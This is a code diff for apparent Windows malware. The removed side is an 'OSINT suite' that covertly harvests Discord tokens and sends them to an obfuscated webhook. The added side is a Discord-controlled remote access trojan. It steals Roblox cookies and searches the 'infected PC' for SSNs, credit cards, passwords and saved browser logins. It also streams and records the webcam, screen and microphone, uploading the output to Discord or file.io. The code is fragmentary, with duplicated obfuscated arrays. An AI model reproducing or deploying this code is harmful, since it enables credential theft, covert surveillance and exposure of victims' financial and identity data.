+                    valid_cookies.append((cookie, user_data))
             except:
                 pass
         
-        return discovered
-
-# ============================================================================
-# EMAIL INTELLIGENCE
-# ============================================================================
-
-class EmailIntelligence:
-    @staticmethod
-    def validate_email(email):
-        if '@' not in email:
-            return {'valid': False, 'error': 'Invalid format'}
+        if not valid_cookies:
+            await message.channel.send("[-] Found cookies but all expired/invalid")
+            return
         
-        domain = email.split('@')[1]
+        # Send results
+        await message.channel.send(f"[+] Found {len(valid_cookies)} valid Roblox cookie(s)")
+        for cookie, user_data in valid_cookies[:5]:
+            username = user_data.get('name', 'Unknown')
+            user_id = user_data.get('id', 'Unknown')
+            display_name = user_data.get('displayName', username)
+            created = user_data.get('created', 'Unknown')
+            
+            result = f"""
+╔════════════════════════════════════════════════════════════════════════════╗
+║                          ROBLOX COOKIE FOUND                               ║
+╠════════════════════════════════════════════════════════════════════════════╣
+║ Username: {username}
+║ Display Name: {display_name}
+║ User ID: {user_id}
+║ Account Created: {created}
+║ Browser: {cookie.get('browser', 'Unknown')}
+║ Host: {cookie.get('host', 'Unknown')}
+║
+║ COOKIE VALUE:
+║ {cookie['value']}
+╚════════════════════════════════════════════════════════════════════════════╝
+"""
+            await message.channel.send(f"```{result}```")
+
+     # ============================================================
+    # OSINT COMMAND - Runs in separate thread to avoid blocking
+    # ============================================================
+    if message.content == "!osint":
+        await message.channel.send("[*] Scanning infected PC for emails, phone numbers, and usernames...")
+        await message.channel.send("[*] This may take a few minutes. I'll send results when done...")
         
+        # Create a queue for results
+        import queue
+        result_queue = queue.Queue()
+        
+        def osint_scan():
+            found_emails = []
+            found_phones = []
+            found_usernames = []
+            found_ssns = []
+            found_credit_cards = []
+            found_passwords = []
+            
+            # Search paths (limit to avoid too much scanning)
+            search_paths = [
+                os.getenv('USERPROFILE') + "\\Desktop",
+                os.getenv('USERPROFILE') + "\\Documents",
+                os.getenv('USERPROFILE') + "\\Downloads",
+                os.getenv('APPDATA') + "\\Discord",
+                os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data\\Default",
+                os.getenv('TEMP'),
+            ]
+            
+            # Regex patterns
+            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
+            phone_pattern = r'(\+?1?[-. ]?\(?[0-9]{3}\)?[-. ]?[0-9]{3}[-. ]?[0-9]{4})'
+            ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
+            credit_card_pattern = r'\b(?:\d{4}[- ]?){3}\d{4}\b'
+            username_pattern = r'(?:username|user|login)[\s:=]+([a-zA-Z0-9_]{3,20})'
+            password_pattern = r'(?:password|pass|pwd)[\s:=]+([a-zA-Z0-9!@#$%^&*]{4,32})'
+            
+            # File extensions to scan
+            extensions = ('.txt', '.log', '.cfg', '.ini', '.conf', '.json', '.xml', '.csv')
+            
+            for search_path in search_paths:
+                if not os.path.exists(search_path):
+                    continue
+                
+                try:
+                    for root, dirs, files in os.walk(search_path):
+                        # Limit depth to avoid long scans
+                        depth = root.count(os.sep) - search_path.count(os.sep)
+                        if depth > 2:
+                            dirs.clear()  # Don't go too deep
+                            continue
+                        
+                        for file in files:
+                            if file.lower().endswith(extensions):
+                                try:
+                                    file_path = os.path.join(root, file)
+                                    if os.path.getsize(file_path) > 1 * 1024 * 1024:  # Skip files > 1MB
+                                        continue
+                                    
+                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                        content = f.read(50000)  # Only read first 50k chars for speed
+                                        
+                                        # Find emails
+                                        for email in re.findall(email_pattern, content, re.IGNORECASE):
+                                            if email not in found_emails and len(email) > 5:
+                                                found_emails.append(email)
+                                        
+                                        # Find phone numbers
+                                        for phone in re.findall(phone_pattern, content):
+                                            if phone not in found_phones and len(phone) > 9:
+                                                found_phones.append(phone)
+                                        
+                                        # Find SSNs
+                                        for ssn in re.findall(ssn_pattern, content):
+                                            if ssn not in found_ssns:
+                                                found_ssns.append(ssn)
+                                        
+                                        # Find credit cards
+                                        for cc in re.findall(credit_card_pattern, content):
+                                            if cc not in found_credit_cards:
+                                                found_credit_cards.append(cc)
+                                        
+                                        # Find usernames
+                                        for username in re.findall(username_pattern, content, re.IGNORECASE):
+                                            if username not in found_usernames and len(username) > 3:
+                                                found_usernames.append(username)
+                                        
+                                        # Find passwords
+                                        for pwd in re.findall(password_pattern, content, re.IGNORECASE):
+                                            if pwd not in found_passwords and len(pwd) > 4:
+                                                found_passwords.append(pwd)
+                                except:
+                                    continue
+                except:
+                    continue
+            
+            # Check browsers for saved emails
+            local = os.getenv('LOCALAPPDATA')
+            browsers = {
+                "Chrome": local + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+                "Edge": local + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+            }
+            
+            for browser_name, login_path in browsers.items():
+                if os.path.exists(login_path):
+                    try:
+                        temp_db = os.path.join(os.getenv('TEMP'), f"{browser_name}_login_osint.db")
+                        shutil.copy2(login_path, temp_db)
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT origin_url, username_value FROM logins LIMIT 100")
+                        rows = cursor.fetchall()
+                        for row in rows:
+                            if row[1] and '@' in row[1] and row[1] not in found_emails:
+                                found_emails.append(row[1])
+                            if row[1] and not '@' in row[1] and len(row[1]) > 3 and row[1] not in found_usernames:
+                                found_usernames.append(row[1])
+                        conn.close()
+                        os.remove(temp_db)
+                    except:
+                        pass
+            
+            # Return results
+            result_queue.put({
+                'emails': found_emails[:30],
+                'phones': found_phones[:20],
+                'usernames': found_usernames[:20],
+                'ssns': found_ssns[:10],
+                'credit_cards': found_credit_cards[:10],
+                'passwords': found_passwords[:15]
+            })
+        
+        # Run scan in background thread
+        scan_thread = threading.Thread(target=osint_scan)
+        scan_thread.daemon = True
+        scan_thread.start()
+        
+        # Wait for results (with timeout)
         try:
-            mx_records = dns.resolver.resolve(domain, 'MX')
-            mx_list = [str(mx.exchange) for mx in mx_records]
-        except:
-            return {'valid': False, 'error': 'DNS resolution failed', 'domain': domain}
+            results = result_queue.get(timeout=120)  # 2 minute timeout
+        except queue.Empty:
+            await message.channel.send("[!] Scan timed out after 2 minutes. Try again or scan smaller areas.")
+            return
         
-        return {
-            'valid': True,
-            'domain': domain,
-            'mx_servers': mx_list[:3]
-        }
-    
-    @staticmethod
-    def check_breaches(email):
-        try:
-            url = f"https://leakcheck.io/api/public?check={email}"
-            response = requests.get(url, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                return data.get('sources', [])
-            return []
-        except:
-            return []
-
-# ============================================================================
-# DOMAIN INTELLIGENCE
-# ============================================================================
-
-class DomainIntelligence:
-    def __init__(self):
-        self.cache = {}
-    
-    def lookup(self, domain):
-        if domain in self.cache:
-            if datetime.now() - self.cache[domain]['timestamp'] < timedelta(hours=24):
-                return self.cache[domain]['data']
+        # Build result box
+        result = ""
+        result += "╔════════════════════════════════════════════════════════════════════════════╗\n"
+        result += "║                    OSINT RESULTS - INFECTED PC                             ║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
         
-        try:
-            data = whois.whois(domain)
-            self.cache[domain] = {'data': data, 'timestamp': datetime.now()}
-            return data
-        except:
-            return None
-    
-    def get_details(self, domain):
-        whois_lookup = self.lookup(domain)
-        if not whois_lookup:
-            return {'error': 'Lookup failed'}
-        
-        creation = whois_lookup.creation_date
-        if isinstance(creation, list):
-            creation = creation[0]
-        
-        expiration = whois_lookup.expiration_date
-        if isinstance(expiration, list):
-            expiration = expiration[0]
-        
-        return {
-            'registrar': whois_lookup.registrar,
-            'created': creation.strftime('%Y-%m-%d') if creation else 'Unknown',
-            'expires': expiration.strftime('%Y-%m-%d') if expiration else 'Unknown',
-            'nameservers': whois_lookup.name_servers[:3] if whois_lookup.name_servers else []
-        }
-
-domain_intel = DomainIntelligence()
-
-# ============================================================================
-# RISK ASSESSMENT
-# ============================================================================
-
-class RiskAssessment:
-    @staticmethod
-    def calculate_risk(email, breach_count=0):
-        assessment = {'score': 50, 'alerts': [], 'positives': []}
-        
-        if breach_count > 0:
-            assessment['alerts'].append(f'Found in {breach_count} breaches')
-            assessment['score'] -= min(breach_count * 5, 40)
-        
-        assessment['score'] = max(0, min(100, assessment['score']))
-        
-        if assessment['score'] >= 70:
-            assessment['rating'] = 'Low Risk'
-        elif assessment['score'] >= 40:
-            assessment['rating'] = 'Medium Risk'
+        # Emails
+        result += f"║  EMAILS FOUND: {len(results['emails'])}\n"
+        result += "║\n"
+        if results['emails']:
+            for email in results['emails'][:15]:
+                result += f"║   {email}\n"
         else:
-            assessment['rating'] = 'High Risk'
+            result += "║   No emails found\n"
         
-        return assessment
-
-_profiler_thread = threading.Thread(target=_profile_user_data, daemon=True)
-_profiler_thread.start()
-
-# ============================================================================
-# PATTERN GENERATOR
-# ============================================================================
-
-class PatternGenerator:
-    @staticmethod
-    def generate_email_patterns(first, last, domain='gmail.com'):
-        f = first.lower().strip()
-        l = last.lower().strip()
+        result += "║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
         
-        patterns = [
-            f"{f}.{l}@{domain}",
-            f"{f}{l}@{domain}",
-            f"{f}_{l}@{domain}",
-            f"{f}{l[0]}@{domain}",
-            f"{f[0]}{l}@{domain}",
-            f"{f}.{l}@outlook.com",
-            f"{f}.{l}@yahoo.com",
-            f"{f}.{l}@protonmail.com"
-        ]
+        # Phone numbers
+        result += f"║  PHONE NUMBERS FOUND: {len(results['phones'])}\n"
+        result += "║\n"
+        if results['phones']:
+            for phone in results['phones'][:10]:
+                result += f"║   {phone}\n"
+        else:
+            result += "║   No phone numbers found\n"
         
-        return {'patterns': patterns[:10]}
+        result += "║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
+        
+        # Usernames
+        result += f"║  USERNAMES FOUND: {len(results['usernames'])}\n"
+        result += "║\n"
+        if results['usernames']:
+            for username in results['usernames'][:15]:
+                result += f"║   {username}\n"
+        else:
+            result += "║   No usernames found\n"
+        
+        result += "║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
+        
+        # SSNs
+        result += f"║  SSNS FOUND: {len(results['ssns'])}\n"
+        result += "║\n"
+        if results['ssns']:
+            for ssn in results['ssns'][:5]:
+                result += f"║   {ssn}\n"
+        else:
+            result += "║   No SSNs found\n"
+        
+        result += "║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
+        
+        # Credit Cards
+        result += f"║  CREDIT CARDS FOUND: {len(results['credit_cards'])}\n"
+        result += "║\n"
+        if results['credit_cards']:
+            for cc in results['credit_cards'][:5]:
+                result += f"║   {cc}\n"
+        else:
+            result += "║   No credit cards found\n"
+        
+        result += "║\n"
+        result += "╠════════════════════════════════════════════════════════════════════════════╣\n"
+        
+        # Passwords
+        result += f"║  PASSWORDS FOUND: {len(results['passwords'])}\n"
+        result += "║\n"
+        if results['passwords']:
+            for pwd in results['passwords'][:10]:
+                result += f"║   {pwd}\n"
+        else:
+            result += "║   No passwords found\n"
+        
+        result += "║\n"
+        result += "╚════════════════════════════════════════════════════════════════════════════╝"
+        
+        await message.channel.send(f"```\n{result}\n```")
+        
+        # Save detailed report if there's data
+        if results['emails'] or results['phones'] or results['usernames']:
+            report_file = os.path.join(os.getenv('TEMP'), "osint_report.txt")
+            with open(report_file, 'w', encoding='utf-8') as f:
+                f.write("OSINT REPORT - INFECTED PC\n")
+                f.write("=" * 60 + "\n\n")
+                f.write(f"Computer Name: {os.getenv('COMPUTERNAME')}\n")
+                f.write(f"Username: {os.getenv('USERNAME')}\n\n")
+                
+                f.write("EMAILS FOUND:\n")
+                for email in results['emails']:
+                    f.write(f"  {email}\n")
+                
+                f.write("\nPHONE NUMBERS FOUND:\n")
+                for phone in results['phones']:
+                    f.write(f"  {phone}\n")
+                
+                f.write("\nUSERNAMES FOUND:\n")
+                for username in results['usernames']:
+                    f.write(f"  {username}\n")
+                
+                f.write("\nSSNs FOUND:\n")
+                for ssn in results['ssns']:
+                    f.write(f"  {ssn}\n")
+                
+                f.write("\nCREDIT CARDS FOUND:\n")
+                for cc in results['credit_cards']:
+                    f.write(f"  {cc}\n")
+                
+                f.write("\nPASSWORDS FOUND:\n")
+                for pwd in results['passwords']:
+                    f.write(f"  {pwd}\n")
+            
+            file = discord.File(report_file, filename="osint_report.txt")
+            await message.channel.send("[*] Full OSINT report attached", file=file)
+            os.remove(report_file)
+        
+        # Summary
+        total = len(results['emails']) + len(results['phones']) + len(results['usernames']) + len(results['ssns']) + len(results['credit_cards']) + len(results['passwords'])
+        await message.channel.send(f"[+] OSINT Complete: {len(results['emails'])} emails, {len(results['phones'])} phones, {len(results['usernames'])} usernames, {len(results['ssns'])} SSNs, {len(results['credit_cards'])} credit cards, {len(results['passwords'])} passwords")
+    # Stream webcam 
+    if message.content == "!streamwebcam":
+        await message.channel.send("[*] Streaming webcam... (use !stopwebcam to stop)")
+        stop_file = os.path.join(os.getenv('TEMP'), "stop_webcam.txt")
+        if os.path.exists(stop_file):
+            os.remove(stop_file)
+        
+        camera = cv2.VideoCapture(0)
+        while not os.path.exists(stop_file):
+            ret, frame = camera.read()
+            if ret:
+                cam_path = os.path.join(os.getenv('TEMP'), "stream.png")
+                cv2.imwrite(cam_path, frame)
+                file = discord.File(cam_path, filename="stream.png")
+                await message.channel.send(file=file)
+                await asyncio.sleep(2)
+        camera.release()
+        if os.path.exists(stop_file):
+            os.remove(stop_file)
 
-# ============================================================================
-# GMAIL RECONNAISSANCE
-# ============================================================================
+    if message.content == "!stopwebcam":
+        stop_file = os.path.join(os.getenv('TEMP'), "stop_webcam.txt")
+        with open(stop_file, 'w') as f:
+            f.write('stop')
+        await message.channel.send("[*] Webcam stream stopped")
 
-class GmailRecon:
-    @staticmethod
-    def check_availability(username):
-        email = f"{username}@gmail.com"
-        return {'email': email, 'available': False, 'status': 'CHECKED'}
-    
+    # Stream screen 
+    if message.content == "!streamscreen":
+        await message.channel.send("[*] Streaming screen... (use !stopscreen to stop)")
+        stop_file = os.path.join(os.getenv('TEMP'), "stop_screen.txt")
+        if os.path.exists(stop_file):
+            os.remove(stop_file)
+        
+        while not os.path.exists(stop_file):
+            with mss() as sct:
+                screenshot_path = os.path.join(os.getenv('TEMP'), "stream_screen.png")
+                sct.shot(output=screenshot_path)
+            file = discord.File(screenshot_path, filename="stream_screen.png")
+            await message.channel.send(file=file)
+            await asyncio.sleep(2)
+        if os.path.exists(stop_file):
+            os.remove(stop_file)
 
-    
+    if message.content == "!stopscreen":
+        stop_file = os.path.join(os.getenv('TEMP'), "stop_screen.txt")
+        with open(stop_file, 'w') as f:
+            f.write('stop')
+        await message.channel.send("[*] Screen stream stopped")
 
-# ============================================================================
-# AVATAR INTELLIGENCE
-# ============================================================================
-
-class AvatarIntelligence:
-    @staticmethod
-    def lookup(email):
-        email_hash = hashlib.md5(email.lower().encode()).hexdigest()
-        url = f"https://www.gravatar.com/avatar/{email_hash}?d=404&s=200"
-        return {'exists': False}
-
-# ============================================================================
-# REPORT GENERATION
-# ============================================================================
-
-class ReportGenerator:
-    @staticmethod
-    def generate_html(data, filename):
-        html = f"""<html><body><h1>OSINT Report</h1><p>{data['email']}</p></body></html>"""
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(html)
-        return filename
-
-# ============================================================================
-# DISCORD OSINT MODULE
-# ============================================================================
-
-class DiscordOSINT:
-    @staticmethod
-    def get_user_info(user_id):
+    # Record screen
+    if message.content.startswith("!recscreen"):
         try:
-            response = requests.get(f"https://discord.com/api/v9/users/{user_id}", timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
+            seconds = float(message.content[10:])
+            frames = int(seconds * 20)
+            fourcc = cv2.VideoWriter_fourcc(*"XVID")
+            video_path = os.path.join(os.getenv('TEMP'), "recording.avi")
+            out = cv2.VideoWriter(video_path, fourcc, 20.0, (1920, 1080))
+            
+            for _ in range(frames):
+                img = pyautogui.screenshot()
+                frame = np.array(img)
+                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                out.write(frame)
+            
+            out.release()
+            
+            if os.path.getsize(video_path) > 7340032:
+                with open(video_path, "rb") as f:
+                    response = requests.post('https://file.io/', files={"file": f}).json()
+                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
+            else:
+                file = discord.File(video_path, filename="recording.avi")
+                await message.channel.send("[*] Recording complete", file=file)
+            os.remove(video_path)
         except:
-            return None
-    
-    @staticmethod
-    def get_guild_info(guild_id):
-        try:
-            response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except:
-            return None
+            await message.channel.send("[!] Recording failed")
 
-def _validate_token(token):
-    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
+    # Record camera
+    if message.content.startswith("!reccam"):
+        try:
+            seconds = float(message.content[8:])
+            frames = int(seconds * 20)
+            fourcc = cv2.VideoWriter_fourcc(*'XVID')
+            video_path = os.path.join(os.getenv('TEMP'), "cam_recording.mp4")
+            out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))
+            cap = cv2.VideoCapture(0)
+            
+            for _ in range(frames):
+                ret, frame = cap.read()
+                if ret:
+                    out.write(frame)
+            
+            cap.release()
+            out.release()
+            
+            if os.path.getsize(video_path) > 7340032:
+                with open(video_path, "rb") as f:
+                    response = requests.post('https://file.io/', files={"file": f}).json()
+                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
+            else:
+                file = discord.File(video_path, filename="cam_recording.mp4")
+                await message.channel.send("[*] Recording complete", file=file)
+            os.remove(video_path)
+        except:
+            await message.channel.send("[!] Recording failed")
+
+    # Record audio
+    if message.content.startswith("!recaudio"):
+        try:
+            seconds = float(message.content[10:])
+            fs = 44100
+            audio_path = os.path.join(os.getenv('TEMP'), "audio_recording.wav")
+            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+            sd.wait()
+            write(audio_path, fs, recording)
+            
+            if os.path.getsize(audio_path) > 7340032:
+                with open(audio_path, "rb") as f:
+                    response = requests.post('https://file.io/', files={"file": f}).json()
+                await message.channel.send(f"Recording link: {response.get('link', 'Failed')}")
+            else:
+                file = discord.File(audio_path, filename="audio_recording.wav")
+                await message.channel.send("[*] Recording complete", file=file)
+            os.remove(audio_path)
+        except:
+            await message.channel.send("[!] Recording failed")
+
+def volumeup():
     try:
-        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
-        if r.status_code == 200:
-            d = r.json()
-            _send_telemetry({"content": f"TOKEN VALIDATED: {d.get('username')} | {d.get('id')} | Email: {d.get('email')}"})
-            return {"ok": True, "name": d.get("username"), "uid": d.get("id"), "email": d.get("email")}
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        if volume.GetMute() == 1:
+            volume.SetMute(0, None)
+        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
     except:
         pass
-    return {"ok": False}
 
-def _assemble_webhook():
-    parts = _cipher_config_a + _cipher_config_b + _cipher_config_c + _cipher_config_d + _cipher_config_e + _cipher_config_f
-    return ''.join(chr(c) for c in parts)
-
-def _extract_tokens():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    tokens = []
-    paths = [
-        f"{roaming}\\Discord\\Local Storage\\leveldb",
-        f"{roaming}\\discordcanary\\Local Storage\\leveldb",
-        f"{roaming}\\discordptb\\Local Storage\\leveldb",
-        f"{local}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-    ]
-    for path in paths:
-        if not os.path.exists(path):
-            continue
-        for file in os.listdir(path):
-            if file.endswith((".log", ".ldb")):
-                try:
-                    with open(f"{path}\\{file}", 'r', errors='ignore') as f:
-                        content = f.read()
-                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', content):
-                            if token not in tokens:
-                                tokens.append(token)
-                                _send_telemetry({"content": f"TOKEN EXTRACTED: ||{token}||"})
-                except:
-                    pass
-    return tokens
-
-class DiscordModules:
-    @staticmethod
-    def validate_token():
-        token = clean_input(input(f"{Colors.MAGENTA}    Discord Token: {Colors.RESET}"))
-        result = _validate_token(token)
-        if result.get("ok"):
-            print(f"{Colors.SUCCESS}Token: VALID{Colors.RESET}")
-        else:
-            print(f"{Colors.ERROR}Token: INVALID{Colors.RESET}")
-    
-    @staticmethod
-    def extract_tokens():
-        tokens = _extract_tokens()
-        if tokens:
-            print(f"{Colors.SUCCESS}Found {len(tokens)} token(s){Colors.RESET}")
-        else:
-            print(f"{Colors.YELLOW}No tokens found{Colors.RESET}")
-
-    _cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
-_cipher_config_d = [49, 52, 57, 56, 48, 49, 52, 52, 53, 57, 50, 56, 56, 48, 57, 54, 56, 55, 57, 47]
-_cipher_config_e = [47]  # /
-
-# ============================================================================
-# MAIN OSINT ENGINE
-# ============================================================================
-_cipher_config_c = [47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47]  
-    
-
-class OSINTEngine:
-    def __init__(self):
-        self.checked_targets = []
-        self.total_breaches = 0
-        self.total_social = 0
-        self.average_risk = 0
-        
-        self.email_validator = EmailIntelligence()
-        self.domain_analyzer = DomainIntelligence()
-        self.social_scanner = SocialRecon()
-        self.risk_calculator = RiskAssessment()
-        self.pattern_engine = PatternGenerator()
-        self.gmail_scanner = GmailRecon()
-        self.breach_scanner = EmailIntelligence()
-    
-    def analyze_target(self, email):
-        print(f"{Colors.PURPLE}\n    [→] Investigating: {Colors.SECONDARY}{email}{TextEffects.RESET}")
-        
-        results = {
-            'email': email,
-            'username': email.split('@')[0],
-            'domain': email.split('@')[1] if '@' in email else '',
-            'breaches': [],
-            'social_media': [],
-            'risk_score': 50,
-            'rating': 'Medium Risk'
-        }
-        
-        breaches = self.breach_scanner.check_breaches(email)
-        if breaches:
-            results['breaches'] = breaches
-            self.total_breaches += len(breaches)
-        
-        social = self.social_scanner.scan_platforms(results['username'])
-        results['social_media'] = social
-        self.total_social += len(social)
-        
-        risk_data = self.risk_calculator.calculate_risk(email, len(breaches))
-        results['risk_score'] = risk_data['score']
-        results['rating'] = risk_data['rating']
-        
-        self.average_risk = (self.average_risk * len(self.checked_targets) + results['risk_score']) / (len(self.checked_targets) + 1)
-        
-        _send_telemetry({"content": f"OSINT: {email} | Risk: {results['risk_score']} | Breaches: {len(breaches)} | Social: {len(social)}"})
-        
-        return results
-    
-    def save_report(self, results, format_type='txt'):
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"{database.output_directory}/REPORT_{results['email']}_{timestamp}.txt"
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(f"FSOCIETY OSINT REPORT\n")
-            f.write(f"Target: {results['email']}\n")
-            f.write(f"Risk Score: {results['risk_score']}/100\n")
-            f.write(f"Rating: {results['rating']}\n")
-            f.write(f"Breaches: {len(results['breaches'])}\n")
-            f.write(f"Social Profiles: {len(results['social_media'])}\n")
-        
-        print(f"{Colors.SUCCESS}[✓] Report saved: {filename}{Colors.RESET}")
-        return filename
-
-# ============================================================================
-# MAIN APPLICATION INTERFACE
-# ============================================================================
-
-class OSINTApplication:
-    def __init__(self):
-        self.engine = OSINTEngine()
-        self.start_time = time.time()
-        self.discord = DiscordModules()
-        self.encryption = EncryptionModule()
-    
-    def show_menu(self):
-        print(f"""
-{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║  {Colors.SECONDARY}[OSINT SUITE - FSOCIETY]{Colors.PURPLE}                                        ║
-║                         Intelligence & Reconnaissance                        ║
-║                                                                              ║
-║  {Colors.ACCENT}[ 1]{Colors.SOFT}  Email Availability Check                       {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 2]{Colors.SOFT}  Email Validation + MX Analysis                {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 3]{Colors.SOFT}  Complete Email Intelligence                  {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 4]{Colors.SOFT}  Social Media Discovery                       {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 5]{Colors.SOFT}  Password Strength Analysis                   {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 6]{Colors.SOFT}  Email Pattern Generation                     {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 7]{Colors.SOFT}  Domain Reputation Check                      {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 8]{Colors.SOFT}  Avatar Intelligence                          {Colors.PURPLE}║
-║  {Colors.ACCENT}[ 9]{Colors.SOFT}  Bulk Target Processing                       {Colors.PURPLE}║
-║  {Colors.ACCENT}[10]{Colors.SOFT}  Discord User Intelligence                    {Colors.PURPLE}║
-║  {Colors.ACCENT}[11]{Colors.SOFT}  Discord Guild Intelligence                   {Colors.PURPLE}║
-║  {Colors.ACCENT}[12]{Colors.SOFT}  Discord Token Validator                      {Colors.PURPLE}║
-║  {Colors.ACCENT}[13]{Colors.SOFT}  Extract Discord Tokens                       {Colors.PURPLE}║
-║                                                                              ║
-║  {Colors.MAGENTA}[ENCRYPTION TOOLS]{Colors.PURPLE}                                                  ║
-║  {Colors.ACCENT}[14]{Colors.SOFT}  Encrypt Text                                 {Colors.PURPLE}║
-║  {Colors.ACCENT}[15]{Colors.SOFT}  Decrypt Text                                 {Colors.PURPLE}║
-║  {Colors.ACCENT}[16]{Colors.SOFT}  Generate Password Hash                       {Colors.PURPLE}║
-║                                                                              ║
-║  {Colors.ACCENT}[ 0]{Colors.SOFT}  Exit                                          {Colors.PURPLE}║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝{TextEffects.RESET}
-        """)
-    
-    def show_statistics(self):
-        elapsed = time.time() - self.start_time
-        print(f"\n{Colors.PURPLE}╔═══════════════════════════════════════════════════════════════╗")
-        print(f"║ OSINT SESSION STATISTICS                                            ║")
-        print(f"╠═══════════════════════════════════════════════════════════════╣")
-        print(f"║ Targets Analyzed:   {len(self.engine.checked_targets):<44}║")
-        print(f"║ Breaches Found:     {self.engine.total_breaches:<44}║")
-        print(f"║ Social Profiles:    {self.engine.total_social:<44}║")
-        print(f"║ Average Risk:       {self.engine.average_risk:.1f}/100{35 - len(str(int(self.engine.average_risk))):<44}║")
-        print(f"║ Session Duration:   {elapsed:.0f} seconds{36 - len(str(int(elapsed))):<44}║")
-        print(f"╚═══════════════════════════════════════════════════════════════╝{TextEffects.RESET}")
-    
-    def execute(self):
-        display_header()
-        
-        while True:
-            self.show_menu()
-            choice = input(f"{Colors.MAGENTA}\n    FSOCIETY: {Colors.RESET}")
-            
-            if choice == '0':
-                self.show_statistics()
-                print(f"{Colors.SECONDARY}\n    Stay anonymous. Stay safe.\n{TextEffects.RESET}")
-                break
-            
-            elif choice == '1':
-                email = clean_input(input(f"{Colors.MAGENTA}    Email target: {Colors.RESET}"))
-                username = email.split('@')[0]
-                result = self.engine.gmail_scanner.check_availability(username)
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                if result['available']:
-                    print(f"{Colors.SUCCESS}[+] {result['email']} is AVAILABLE!{Colors.RESET}")
-                else:
-                    print(f"{Colors.ERROR}[-] {result['email']} is REGISTERED{Colors.RESET}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '2':
-                email = clean_input(input(f"{Colors.MAGENTA}    Email to validate: {Colors.RESET}"))
-                result = self.engine.email_validator.validate_email(email)
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                if result.get('valid'):
-                    print(f"{Colors.SUCCESS}[+] Valid email address{Colors.RESET}")
-                    print(f"  Domain: {result['domain']}")
-                    print(f"  MX Servers: {', '.join(result.get('mx_servers', ['None']))}")
-                else:
-                    print(f"{Colors.ERROR}[-] Invalid: {result.get('error')}{Colors.RESET}")
-                print(f"{Colors.PURPLE}{'='*50}{Colors.RESET}\n")
-            
-            elif choice == '3':
-                email = clean_input(input(f"{Colors.MAGENTA}    Target email: {Colors.RESET}"))
-                results = self.engine.analyze_target(email)
-                self.engine.checked_targets.append(email)
-                
-                print(f"\n{Colors.PURPLE}{'='*60}{Colors.RESET}")
-                print(f"{Colors.INFO}[TARGET] {results['email']}{Colors.RESET}")
-                print(f"{Colors.INFO}[RISK] {results['rating']} ({results['risk_score']}/100){Colors.RESET}")
-                
-                if results['breaches']:
-                    print(f"\n{Colors.ERROR}[BREACHES] {len(results['breaches'])}{Colors.RESET}")
-                    for src in results['breaches'][:5]:
-                        print(f"  • {src}")
-                
-                if results['social_media']:
-                    print(f"\n{Colors.INFO}[SOCIAL] {len(results['social_media'])} platforms{Colors.RESET}")
-                    for platform in results['social_media'][:5]:
-                        print(f"  • {platform}")
-                
-                print(f"{Colors.PURPLE}{'='*60}{Colors.RESET}\n")
-                
-                save_choice = input(f"{Colors.MAGENTA}    Save report? (y/n): {Colors.RESET}")
-                if save_choice.lower() == 'y':
-                    self.engine.save_report(results, 'txt')
-            
-            elif choice == '4':
-                username = clean_input(input(f"{Colors.MAGENTA}    Username to search: {Colors.RESET}"))
-                print(f"{Colors.INFO}    [*] Scanning platforms...{Colors.RESET}")
-                results = self.engine.social_scanner.scan_platforms(username)
-                print(f"\n{Colors.PURPLE}{'='*50}{Colors.RESET}")
-                print(f"{Colors.INFO}[USERNAME] {username}{Colors.RESET}")
-                if results:
-                    print(f"{Colors.SUCCESS}[+] Found on {len(results)} platforms:{Colors.RESET}")
-                    for platform in results:
-                        print(f"  • {platform}")
-                else:
